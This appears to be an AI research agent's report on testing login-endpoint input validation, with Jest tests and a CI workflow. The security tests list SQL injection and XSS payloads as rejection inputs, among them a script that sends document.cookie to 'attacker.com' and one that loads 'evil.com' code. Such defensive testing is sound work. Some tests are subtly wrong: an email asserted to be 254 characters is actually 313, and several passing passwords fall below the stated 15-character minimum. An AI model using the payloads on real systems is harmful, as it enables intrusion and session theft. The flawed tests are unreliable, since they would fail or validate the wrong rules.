# Validation Testing Strategies for Authentication Endpoints

## Metadata
- **Date**: 2025-11-17
- **Agent**: research-specialist
- **Topic**: Comprehensive testing strategies for input validation in authentication endpoints
- **Report Type**: testing methodology

## Executive Summary

This report provides comprehensive testing strategies for authentication endpoint input validation, covering unit testing, integration testing, security testing, and test automation. Testing should validate both positive cases (accepting valid input) and negative cases (rejecting invalid/malicious input), with special emphasis on boundary conditions, attack patterns, and timing consistency. The codebase demonstrates strong validation patterns in shell scripts that can be adapted for authentication endpoint testing.

## Findings

### Testing Patterns in Existing Codebase

#### Shell Script Validation Testing Patterns

**Location**: `/home/benjamin/.config/.claude/lib/verification-helpers.sh`

**Pattern 1: File Verification with Multi-Level Checks**
```bash
# Lines 73-124
verify_file_created() {
  local file_path="$1"
  local file_type="${2:-File}"
  local context="${3:-}"

  # Level 1: Existence check
  if [[ ! -e "$file_path" ]]; then
    echo "ERROR: $file_type not found at: $file_path"
    return 1
  fi

  # Level 2: Readability check
  if [[ ! -r "$file_path" ]]; then
    echo "ERROR: $file_type exists but is not readable: $file_path"
    return 1
  fi

  # Level 3: Content check
  if [[ ! -s "$file_path" ]]; then
    echo "ERROR: $file_type is empty: $file_path"
    return 1
  fi

  # All checks passed
  return 0
}
```

**Testing Principles Demonstrated**:
1. **Progressive Validation**: Each level builds on previous
2. **Specific Error Messages**: Clear indication of which check failed
3. **Early Return**: Fail fast on first violation
4. **Context-Rich Feedback**: Include file type and context in errors

**Pattern 2: State Variable Verification**
```bash
# Lines 223-258
verify_state_variable() {
  local var_name="$1"

  # Check 1: Environment variable exists
  if [[ -z "${STATE_FILE:-}" ]]; then
    echo "ERROR [verify_state_variable]: STATE_FILE not set"
    return 1
  fi

  # Check 2: State file exists
  if [[ ! -f "$STATE_FILE" ]]; then
    echo "ERROR [verify_state_variable]: State file does not exist"
    return 1
  fi

  # Check 3: Variable is present in file
  if ! grep -q "^${var_name}=" "$STATE_FILE"; then
    echo "ERROR [verify_state_variable]: Variable not found in state file"
    return 1
  fi

  return 0
}
```

**Testing Principles**:
1. **Precondition Validation**: Check environment before operation
2. **Resource Verification**: Confirm dependencies exist
3. **Content Validation**: Verify expected data present
4. **Failure Isolation**: Identify exact point of failure

**Pattern 3: Checkbox State Validation**
```bash
# Lines 33-62
if [[ "$new_state" != "x" && "$new_state" != " " ]]; then
  echo "ERROR: Invalid state '$new_state'. Must be 'x' or ' '"
  return 1
fi
```

**Testing Principles**:
1. **Allowlist Validation**: Only accept known-good values
2. **Explicit Requirements**: Clear specification of valid inputs
3. **Immediate Rejection**: Fail on first invalid value

### Unit Testing Strategies

#### 1. Positive Test Cases (Valid Input)

**Purpose**: Verify system accepts legitimate authentication attempts.

**Test Categories**:

**A. Standard Valid Inputs**
```javascript
describe('Valid Authentication Input', () => {
  test('accepts standard email/password combination', async () => {
    const result = await authenticate({
      email: 'user@example.com',
      password: 'SecurePassword123!'
    });

    expect(result.success).toBe(true);
    expect(result.token).toBeDefined();
  });

  test('accepts email with subdomains', async () => {
    const result = await authenticate({
      email: 'user@mail.subdomain.example.com',
      password: 'ValidPass456'
    });

    expect(result.success).toBe(true);
  });

  test('accepts email with plus addressing', async () => {
    const result = await authenticate({
      email: 'user+tag@example.com',
      password: 'Password789'
    });

    expect(result.success).toBe(true);
  });

  test('accepts maximum length password', async () => {
    const longPassword = 'a'.repeat(128); // Max 128 characters

    const result = await authenticate({
      email: 'user@example.com',
      password: longPassword
    });

    expect(result.success).toBe(true);
  });
});
```

**B. Edge Cases (Valid but Boundary Conditions)**
```javascript
describe('Boundary Condition Valid Inputs', () => {
  test('accepts minimum length password with MFA enabled', async () => {
    const user = await createUserWithMFA({
      email: 'user@example.com',
      password: 'abcd1234' // Exactly 8 characters
    });

    const result = await authenticate({
      email: 'user@example.com',
      password: 'abcd1234',
      mfaCode: '123456'
    });

    expect(result.success).toBe(true);
  });

  test('accepts password with all special characters', async () => {
    const specialPassword = '!@#$%^&*()_+-=[]{}|;:,.<>?/~`15chars';

    const result = await authenticate({
      email: 'user@example.com',
      password: specialPassword
    });

    expect(result.success).toBe(true);
  });

  test('accepts password with Unicode characters', async () => {
    const unicodePassword = 'Pássw0rd密码Паро́ль';

    const result = await authenticate({
      email: 'user@example.com',
      password: unicodePassword
    });

    expect(result.success).toBe(true);
  });

  test('accepts password with whitespace', async () => {
    const result = await authenticate({
      email: 'user@example.com',
      password: 'my secure pass phrase'
    });

    expect(result.success).toBe(true);
  });

  test('accepts maximum length email (254 characters)', async () => {
    const localPart = 'a'.repeat(64);
    const domain = 'b'.repeat(180) + '.example.com'; // Total ~254
    const maxEmail = `${localPart}@${domain}`;

    const result = await authenticate({
      email: maxEmail,
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(true);
  });
});
```

#### 2. Negative Test Cases (Invalid Input)

**Purpose**: Verify system rejects malicious or malformed authentication attempts.

**A. Format Validation**
```javascript
describe('Invalid Input Format Rejection', () => {
  test('rejects empty email', async () => {
    const result = await authenticate({
      email: '',
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
    expect(result.error).toBe('Authentication failed. Please check your credentials.');
  });

  test('rejects malformed email (missing @)', async () => {
    const result = await authenticate({
      email: 'userexample.com',
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('rejects email with no domain', async () => {
    const result = await authenticate({
      email: 'user@',
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('rejects email with invalid characters', async () => {
    const invalidEmails = [
      'user space@example.com',
      'user<script>@example.com',
      'user"quotes@example.com',
      'user\\slash@example.com'
    ];

    for (const email of invalidEmails) {
      const result = await authenticate({
        email: email,
        password: 'ValidPassword123'
      });

      expect(result.success).toBe(false);
    }
  });

  test('rejects password below minimum length', async () => {
    const result = await authenticate({
      email: 'user@example.com',
      password: 'short' // Less than 15 characters without MFA
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('Password must be at least');
  });

  test('rejects password exceeding maximum length', async () => {
    const tooLongPassword = 'a'.repeat(200); // Exceeds max 128

    const result = await authenticate({
      email: 'user@example.com',
      password: tooLongPassword
    });

    expect(result.success).toBe(false);
    expect(result.error).toContain('exceeds maximum length');
  });
});
```

**B. SQL Injection Prevention**
```javascript
describe('SQL Injection Attack Prevention', () => {
  test('rejects SQL comment injection in username', async () => {
    const sqlInjections = [
      "admin'--",
      "admin' --",
      "admin'#",
      "admin' /*"
    ];

    for (const injection of sqlInjections) {
      const result = await authenticate({
        email: injection,
        password: 'anything'
      });

      expect(result.success).toBe(false);
      expect(result.error).toBe('Authentication failed. Please check your credentials.');
    }
  });

  test('rejects OR condition injection', async () => {
    const sqlInjections = [
      "admin' OR '1'='1",
      "admin' OR 1=1--",
      "' OR 'a'='a",
      "admin' OR TRUE--"
    ];

    for (const injection of sqlInjections) {
      const result = await authenticate({
        email: injection,
        password: injection
      });

      expect(result.success).toBe(false);
    }
  });

  test('rejects UNION-based injection', async () => {
    const result = await authenticate({
      email: "admin' UNION SELECT NULL, username, password FROM users--",
      password: 'anything'
    });

    expect(result.success).toBe(false);
  });

  test('rejects stacked query injection', async () => {
    const result = await authenticate({
      email: "admin'; DROP TABLE users;--",
      password: 'anything'
    });

    expect(result.success).toBe(false);

    // Verify users table still exists
    const userCount = await User.count();
    expect(userCount).toBeGreaterThan(0);
  });

  test('rejects time-based blind SQL injection', async () => {
    const result = await authenticate({
      email: "admin' AND SLEEP(5)--",
      password: 'anything'
    });

    expect(result.success).toBe(false);

    // Should not cause 5-second delay
    // (Test with timeout to ensure no delay occurs)
  });
});
```

**C. XSS Attack Prevention**
```javascript
describe('XSS Attack Prevention', () => {
  test('rejects script tag injection', async () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<script>fetch("https://attacker.com?cookie="+document.cookie)</script>',
      '<script src="https://evil.com/malicious.js"></script>'
    ];

    for (const payload of xssPayloads) {
      const result = await authenticate({
        email: payload,
        password: 'ValidPassword123'
      });

      expect(result.success).toBe(false);

      // Verify response is properly escaped
      const response = result.toString();
      expect(response).not.toContain('<script>');
      expect(response).not.toContain('alert(');
    }
  });

  test('rejects event handler injection', async () => {
    const xssPayloads = [
      '<img src=x onerror=alert(1)>',
      '<body onload=alert(1)>',
      '<svg onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>'
    ];

    for (const payload of xssPayloads) {
      const result = await authenticate({
        email: payload,
        password: 'ValidPassword123'
      });

      expect(result.success).toBe(false);
    }
  });

  test('rejects javascript protocol injection', async () => {
    const result = await authenticate({
      email: 'javascript:alert(document.cookie)',
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('ensures error messages are HTML-escaped', async () => {
    const result = await authenticate({
      email: '<script>alert("XSS")</script>@example.com',
      password: 'wrong'
    });

    // Error message should not contain executable script
    expect(result.error).not.toMatch(/<script>/i);

    // Should be escaped if included
    if (result.error.includes('script')) {
      expect(result.error).toContain('&lt;script&gt;');
    }
  });
});
```

**D. Encoding Bypass Prevention**
```javascript
describe('Encoding Bypass Prevention', () => {
  test('rejects HTML entity encoded XSS', async () => {
    const encodedPayloads = [
      '&#60;script&#62;alert("XSS")&#60;/script&#62;',
      '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;'
    ];

    for (const payload of encodedPayloads) {
      const result = await authenticate({
        email: payload,
        password: 'ValidPassword123'
      });

      expect(result.success).toBe(false);
    }
  });

  test('rejects URL encoded injection', async () => {
    const result = await authenticate({
      email: '%3Cscript%3Ealert(1)%3C/script%3E',
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('rejects double encoded injection', async () => {
    const result = await authenticate({
      email: '%253Cscript%253E', // Double URL encoded <script>
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('rejects Unicode escaped injection', async () => {
    const result = await authenticate({
      email: '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('rejects nested tag bypass', async () => {
    const result = await authenticate({
      email: '<scr<script>ipt>alert(1)</script>',
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });
});
```

**E. Boundary Condition Testing**
```javascript
describe('Boundary Condition Validation', () => {
  test('rejects email with local part > 64 characters', async () => {
    const longLocal = 'a'.repeat(65);
    const result = await authenticate({
      email: `${longLocal}@example.com`,
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('rejects email total length > 254 characters', async () => {
    const longEmail = 'a'.repeat(64) + '@' + 'b'.repeat(190) + '.com';
    const result = await authenticate({
      email: longEmail,
      password: 'ValidPassword123'
    });

    expect(result.success).toBe(false);
  });

  test('accepts email at exactly 254 characters', async () => {
    // Construct 254-char email: 64 + @ + 189
    const email = 'a'.repeat(64) + '@' + 'b'.repeat(244) + '.com';

    expect(email.length).toBe(254);

    const result = await authenticate({
      email: email,
      password: 'ValidPassword123'
    });

    // Should be accepted (at boundary)
    expect(result.success).toBe(true);
  });

  test('rejects password with 14 characters (below minimum without MFA)', async () => {
    const result = await authenticate({
      email: 'user@example.com',
      password: 'a'.repeat(14)
    });

    expect(result.success).toBe(false);
  });

  test('accepts password with exactly 15 characters', async () => {
    const result = await authenticate({
      email: 'user@example.com',
      password: 'a'.repeat(15)
    });

    expect(result.success).toBe(true);
  });
});
```

#### 3. Rate Limiting Tests

```javascript
describe('Rate Limiting Validation', () => {
  beforeEach(() => {
    // Reset rate limiter state before each test
    resetRateLimiter();
  });

  test('allows requests within rate limit', async () => {
    const attempts = [];

    // Make 5 attempts (within limit)
    for (let i = 0; i < 5; i++) {
      attempts.push(
        authenticate({
          email: 'user@example.com',
          password: 'wrong'
        })
      );
    }

    const results = await Promise.all(attempts);

    // All should receive auth error (not rate limit error)
    results.forEach(result => {
      expect(result.error).not.toContain('Too many');
      expect(result.status).toBe(401);
    });
  });

  test('blocks requests exceeding rate limit', async () => {
    // Exhaust rate limit (5 attempts)
    for (let i = 0; i < 5; i++) {
      await authenticate({
        email: 'user@example.com',
        password: 'wrong'
      });
    }

    // 6th attempt should be rate limited
    const result = await authenticate({
      email: 'user@example.com',
      password: 'wrong'
    });

    expect(result.status).toBe(429);
    expect(result.error).toContain('Too many attempts');
  });

  test('resets rate limit after window expires', async () => {
    // Exhaust limit
    for (let i = 0; i < 5; i++) {
      await authenticate({
        email: 'user@example.com',
        password: 'wrong'
      });
    }

    // Simulate time passage (15 minutes)
    jest.advanceTimersByTime(15 * 60 * 1000);

    // Should allow new attempts
    const result = await authenticate({
      email: 'user@example.com',
      password: 'wrong'
    });

    expect(result.status).toBe(401); // Auth error, not rate limit
  });

  test('enforces per-account rate limiting independently', async () => {
    // Exhaust limit for user1
    for (let i = 0; i < 5; i++) {
      await authenticate({
        email: 'user1@example.com',
        password: 'wrong'
      });
    }

    // user2 should still be allowed
    const result = await authenticate({
      email: 'user2@example.com',
      password: 'wrong'
    });

    expect(result.status).toBe(401); // Not rate limited
  });

  test('enforces per-IP rate limiting across accounts', async () => {
    // Try different accounts from same IP
    const accounts = ['user1', 'user2', 'user3', 'user4', 'user5', 'user6'];

    for (const username of accounts) {
      await authenticate({
        email: `${username}@example.com`,
        password: 'wrong'
      });
    }

    // Last attempt should be rate limited (same IP)
    const result = await authenticate({
      email: 'newuser@example.com',
      password: 'wrong'
    });

    expect(result.status).toBe(429);
  });
});
```

#### 4. User Enumeration Prevention Tests

```javascript
describe('User Enumeration Prevention', () => {
  test('returns identical error message for non-existent user', async () => {
    const result = await authenticate({
      email: 'nonexistent@example.com',
      password: 'anything'
    });

    expect(result.error).toBe('Authentication failed. Please check your credentials.');
    expect(result.status).toBe(401);
  });

  test('returns identical error message for wrong password', async () => {
    // Create user first
    await createUser({
      email: 'existing@example.com',
      password: 'CorrectPassword123'
    });

    const result = await authenticate({
      email: 'existing@example.com',
      password: 'WrongPassword'
    });

    expect(result.error).toBe('Authentication failed. Please check your credentials.');
    expect(result.status).toBe(401);
  });

  test('maintains consistent response timing', async () => {
    const timings = { nonexistent: [], wrongPassword: [] };

    // Time non-existent user attempts
    for (let i = 0; i < 20; i++) {
      const start = Date.now();
      await authenticate({
        email: 'nonexistent@example.com',
        password: 'password'
      });
      timings.nonexistent.push(Date.now() - start);
    }

    // Create user
    await createUser({
      email: 'existing@example.com',
      password: 'CorrectPassword123'
    });

    // Time wrong password attempts
    for (let i = 0; i < 20; i++) {
      const start = Date.now();
      await authenticate({
        email: 'existing@example.com',
        password: 'WrongPassword'
      });
      timings.wrongPassword.push(Date.now() - start);
    }

    // Calculate averages
    const avgNonexistent = timings.nonexistent.reduce((a, b) => a + b) / 20;
    const avgWrongPassword = timings.wrongPassword.reduce((a, b) => a + b) / 20;

    // Difference should be minimal (< 50ms acceptable variance)
    expect(Math.abs(avgNonexistent - avgWrongPassword)).toBeLessThan(50);
  });

  test('performs dummy hash comparison for non-existent users', async () => {
    // Spy on bcrypt.compare calls
    const compareSpy = jest.spyOn(bcrypt, 'compare');

    await authenticate({
      email: 'nonexistent@example.com',
      password: 'password'
    });

    // Should still call compare (with dummy hash)
    expect(compareSpy).toHaveBeenCalled();
  });
});
```

### Integration Testing Strategies

#### 1. Full Authentication Flow

```javascript
describe('Complete Authentication Flow', () => {
  test('registration -> email verification -> login -> access', async () => {
    // Step 1: Register
    const regResponse = await request(app)
      .post('/api/register')
      .send({
        email: 'newuser@example.com',
        password: 'SecurePassword123!'
      });

    expect(regResponse.status).toBe(201);

    // Step 2: Get verification token from mock email
    const verificationToken = await getLastEmailToken('newuser@example.com');

    // Step 3: Verify email
    const verifyResponse = await request(app)
      .get(`/api/verify-email?token=${verificationToken}`);

    expect(verifyResponse.status).toBe(200);

    // Step 4: Login
    const loginResponse = await request(app)
      .post('/api/login')
      .send({
        email: 'newuser@example.com',
        password: 'SecurePassword123!'
      });

    expect(loginResponse.status).toBe(200);
    expect(loginResponse.body.token).toBeDefined();

    // Step 5: Access protected resource
    const protectedResponse = await request(app)
      .get('/api/profile')
      .set('Authorization', `Bearer ${loginResponse.body.token}`);

    expect(protectedResponse.status).toBe(200);
    expect(protectedResponse.body.email).toBe('newuser@example.com');
  });

  test('failed login -> rate limit -> success after reset', async () => {
    // Create user
    await createUser({
      email: 'user@example.com',
      password: 'CorrectPassword123'
    });

    // Failed attempts
    for (let i = 0; i < 5; i++) {
      const response = await request(app)
        .post('/api/login')
        .send({
          email: 'user@example.com',
          password: 'WrongPassword'
        });

      expect(response.status).toBe(401);
    }

    // Should be rate limited
    const rateLimitedResponse = await request(app)
      .post('/api/login')
      .send({
        email: 'user@example.com',
        password: 'CorrectPassword123' // Even with correct password
      });

    expect(rateLimitedResponse.status).toBe(429);

    // Advance time
    jest.advanceTimersByTime(15 * 60 * 1000);

    // Should succeed now
    const successResponse = await request(app)
      .post('/api/login')
      .send({
        email: 'user@example.com',
        password: 'CorrectPassword123'
      });

    expect(successResponse.status).toBe(200);
  });
});
```

#### 2. MFA Flow Testing

```javascript
describe('Multi-Factor Authentication Flow', () => {
  test('login with MFA enabled requires valid code', async () => {
    // Create user with MFA
    const user = await createUser({
      email: 'mfauser@example.com',
      password: 'Password123',
      mfaEnabled: true
    });

    // Step 1: Login with credentials
    const loginResponse = await request(app)
      .post('/api/login')
      .send({
        email: 'mfauser@example.com',
        password: 'Password123'
      });

    expect(loginResponse.status).toBe(200);
    expect(loginResponse.body.requiresMFA).toBe(true);
    expect(loginResponse.body.token).toBeUndefined();

    // Step 2: Submit invalid MFA code
    const invalidMFAResponse = await request(app)
      .post('/api/login')
      .send({
        email: 'mfauser@example.com',
        password: 'Password123',
        mfaCode: '000000'
      });

    expect(invalidMFAResponse.status).toBe(401);

    // Step 3: Submit valid MFA code
    const validCode = generateTOTP(user.mfaSecret);
    const validMFAResponse = await request(app)
      .post('/api/login')
      .send({
        email: 'mfauser@example.com',
        password: 'Password123',
        mfaCode: validCode
      });

    expect(validMFAResponse.status).toBe(200);
    expect(validMFAResponse.body.token).toBeDefined();
  });
});
```

### Security Testing Strategies

#### 1. Automated Security Scanning

```javascript
// Using OWASP ZAP API
describe('Automated Security Scanning', () => {
  test('runs ZAP active scan on authentication endpoints', async () => {
    const zap = new ZapClient('http://localhost:8080');

    // Configure ZAP
    await zap.spider.scan('http://localhost:3000');
    await zap.spider.waitForComplete();

    // Run active scan
    const scanId = await zap.ascan.scan('http://localhost:3000/api/login');
    await zap.ascan.waitForComplete(scanId);

    // Get alerts
    const alerts = await zap.core.alerts('http://localhost:3000');

    // Filter for high/critical issues
    const criticalIssues = alerts.filter(a => a.risk === 'High' || a.risk === 'Critical');

    expect(criticalIssues).toHaveLength(0);
  });
});
```

#### 2. Penetration Testing Scripts

```javascript
describe('Penetration Testing', () => {
  test('SQL injection attack matrix', async () => {
    const sqlInjectionVectors = [
      "' OR '1'='1",
      "admin'--",
      "' OR 1=1--",
      "'; DROP TABLE users--",
      "admin' UNION SELECT NULL--",
      "' WAITFOR DELAY '00:00:05'--",
      "1' AND SLEEP(5)--"
    ];

    for (const vector of sqlInjectionVectors) {
      const result = await request(app)
        .post('/api/login')
        .send({
          email: vector,
          password: vector
        });

      // Should reject with 401, not 500 (server error)
      expect(result.status).toBe(401);
      expect(result.body.error).toBe('Authentication failed. Please check your credentials.');
    }

    // Verify database integrity
    const userCount = await User.count();
    expect(userCount).toBeGreaterThan(0);
  });

  test('XSS attack vector matrix', async () => {
    const xssVectors = [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>'
    ];

    for (const vector of xssVectors) {
      const result = await request(app)
        .post('/api/login')
        .send({
          email: vector,
          password: 'password'
        });

      // Response should not contain unescaped payload
      expect(result.text).not.toContain('<script>');
      expect(result.text).not.toContain('alert(1)');
      expect(result.text).not.toContain('onerror=');
    }
  });

  test('CSRF token validation', async () => {
    // Get CSRF token
    const formResponse = await request(app)
      .get('/login');

    const csrfToken = extractCSRFToken(formResponse.text);

    // Valid request with token
    const validResponse = await request(app)
      .post('/api/login')
      .set('X-CSRF-Token', csrfToken)
      .send({
        email: 'user@example.com',
        password: 'password'
      });

    expect(validResponse.status).not.toBe(403);

    // Invalid request without token
    const invalidResponse = await request(app)
      .post('/api/login')
      .send({
        email: 'user@example.com',
        password: 'password'
      });

    expect(invalidResponse.status).toBe(403);
  });
});
```

### Test Automation and CI/CD Integration

#### 1. Test Suite Organization

```javascript
// tests/authentication/
// ├── unit/
// │   ├── validation.test.js
// │   ├── rate-limiting.test.js
// │   └── error-handling.test.js
// ├── integration/
// │   ├── auth-flow.test.js
// │   ├── mfa.test.js
// │   └── password-reset.test.js
// └── security/
//     ├── sql-injection.test.js
//     ├── xss-prevention.test.js
//     └── csrf-protection.test.js

// package.json
{
  "scripts": {
    "test": "jest",
    "test:unit": "jest tests/authentication/unit",
    "test:integration": "jest tests/authentication/integration",
    "test:security": "jest tests/authentication/security",
    "test:coverage": "jest --coverage",
    "test:watch": "jest --watch"
  }
}
```

#### 2. CI/CD Pipeline Configuration

```yaml
# .github/workflows/auth-tests.yml
name: Authentication Tests

on: [push, pull_request]

jobs:
  test:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v2

      - name: Setup Node.js
        uses: actions/setup-node@v2
        with:
          node-version: '18'

      - name: Install dependencies
        run: npm ci

      - name: Run unit tests
        run: npm run test:unit

      - name: Run integration tests
        run: npm run test:integration
        env:
          DATABASE_URL: ${{ secrets.TEST_DATABASE_URL }}

      - name: Run security tests
        run: npm run test:security

      - name: Generate coverage report
        run: npm run test:coverage

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v2

      - name: Run OWASP ZAP scan
        run: |
          docker run -t owasp/zap2docker-stable zap-baseline.py \
            -t http://localhost:3000 \
            -r zap_report.html

      - name: Fail on critical security issues
        run: |
          if grep -q "High\|Critical" zap_report.html; then
            echo "Critical security issues found"
            exit 1
          fi
```

## Recommendations

### 1. Implement Comprehensive Test Coverage

**Priority**: Critical

**Target Coverage**:
- Unit tests: 95%+ code coverage
- Integration tests: All authentication flows
- Security tests: OWASP Top 10 attack vectors
- Boundary tests: All input field limits

### 2. Adopt Test-Driven Development for Validation Logic

**Priority**: High

**Process**:
1. Write failing test for attack vector
2. Implement validation to pass test
3. Refactor and verify test still passes
4. Add to regression suite

### 3. Automate Security Testing in CI/CD

**Priority**: Critical

**Tools**:
- OWASP ZAP for automated scanning
- Jest/Mocha for unit/integration tests
- Snyk for dependency vulnerability scanning
- SonarQube for code quality and security

### 4. Establish Security Testing Baseline

**Priority**: High

**Metrics**:
- Zero high/critical vulnerabilities
- 100% of OWASP Top 10 attack vectors tested
- < 50ms timing variance between error paths
- Rate limiting functional in all scenarios

### 5. Conduct Regular Penetration Testing

**Priority**: Medium

**Frequency**:
- Automated: Every commit/PR
- Manual: Quarterly
- Third-party: Annually

### 6. Implement Continuous Monitoring

**Priority**: Medium

**Monitoring**:
- Failed authentication rate
- Rate limit trigger frequency
- Attack pattern detection
- Response time anomalies

## References

### Testing Frameworks and Tools
- Jest: https://jestjs.io/
- Supertest: https://github.com/ladjs/supertest
- OWASP ZAP: https://www.zaproxy.org/
- Burp Suite: https://portswigger.net/burp
- Snyk: https://snyk.io/
- SonarQube: https://www.sonarqube.org/

### Codebase Testing Patterns
- `/home/benjamin/.config/.claude/lib/verification-helpers.sh` (lines 73-282)
  - Multi-level validation pattern
  - Progressive verification approach
  - Error collection and reporting

- `/home/benjamin/.config/.claude/lib/checkbox-utils.sh` (lines 28-62)
  - Allowlist validation example
  - State validation pattern

### Testing Standards
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Authentication Testing: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/README
- NIST SP 800-63B Testing Guidelines
